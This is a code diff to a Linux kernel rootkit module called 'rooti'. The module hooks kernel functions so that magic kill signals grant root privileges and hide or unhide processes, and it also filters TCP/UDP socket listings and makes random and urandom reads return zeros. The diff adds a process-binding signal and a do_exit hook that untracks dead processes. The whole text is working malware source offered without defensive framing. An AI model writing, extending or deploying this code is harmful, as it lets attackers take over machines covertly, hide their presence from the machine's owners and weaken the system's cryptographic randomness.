@@ -65,23 +65,27 @@ static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
+static void (*orig_do_exit)(long code);
 
 
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
-
-    if (sig == ROOTI_SIG_PE) {
+    // TODO: clear remaining records
+    switch (sig)
+    {
+    case ROOTI_SIG_PE:
         return rooti_elevate_privilege();
-    }
-    else if (sig == ROOTI_SIG_PROC_HIDE) {
+    case ROOTI_SIG_PROC_HIDE:
         return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
-    }
-    else if (sig == ROOTI_SIG_PROC_UNHIDE) {
+    case ROOTI_SIG_PROC_UNHIDE:
         rooti_untrack_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
         return 0;
+    case ROOTI_SIG_PROC_BIND:
+        return rooti_track_proc_attr(current->pid, ROOTI_PROC_BOUND, &rooti_tracked_procs);
+    default:
+        return orig_kill(regs);
     }
-    return orig_kill(regs);
 }
 
 static asmlinkage long hook_openat(const struct pt_regs *regs)
@@ -255,6 +259,16 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     return orig_udp4_seq_show(seq, v);
 }
 
+static void hook_do_exit(long code)
+{
+    struct rooti_tracked_proc *proc = rooti_search_tracked_proc(current->pid, &rooti_tracked_procs);
+    if (proc == NULL) orig_do_exit(code); 
+
+    rooti_untrack_proc(proc);
+    ROOTI_DEBUG("the tracked process is now dead!");
+    orig_do_exit(code);
+}
+
 static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
 {
     // Get the size of the user buffer and allocate a matching kernel buffer filled with zeros
@@ -290,6 +304,7 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt),
     ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
+    ROOTI_FUNC_HOOK("do_exit", hook_do_exit, &orig_do_exit),
     ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
     ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
 };
